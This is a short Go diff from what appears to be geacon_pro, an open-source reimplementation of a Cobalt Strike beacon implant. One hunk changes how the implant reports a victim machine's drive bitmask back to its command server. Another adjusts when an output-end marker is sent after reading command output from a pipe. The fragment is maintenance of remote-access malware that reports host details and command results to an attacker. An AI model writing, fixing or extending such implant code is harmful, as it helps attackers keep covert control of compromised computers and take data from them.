@@ -38,17 +38,8 @@ func listDrivesImpl(b []byte) error {
 	if err != nil {
 		return err
 	}
-	var result []byte
-	// extremely strange...
-	// cs server consider 47 as A, 48 as B, and so on
-	i := 47
-	for bitMask > 0 {
-		if bitMask%2 == 1 {
-			result = append(result, byte(i))
-		}
-		bitMask >>= 1
-		i++
-	}
+	// geacon_pro FIX CMD_TYPE_DRIVES BUG #34
+	result := []byte(util.Sprintf("%d", bitMask))
 	packet.PushResult(packet.CALLBACK_PENDING, util.BytesCombine(b[0:4], result))
 	return nil
 }
@@ -245,7 +236,7 @@ func loopRead(handle windows.Handle, hRPipe windows.Handle, sleepTime int, callb
 	case packet.CALLBACK_SCREENSHOT:
 		packet.PushResult(callbackType, buf[4:])
 	case packet.CALLBACK_OUTPUT:
-		if cnt > 1 {
+		if cnt > 2 {
 			packet.PushResult(callbackType, []byte("--------------------------output end--------------------------"))
 		}
 	}
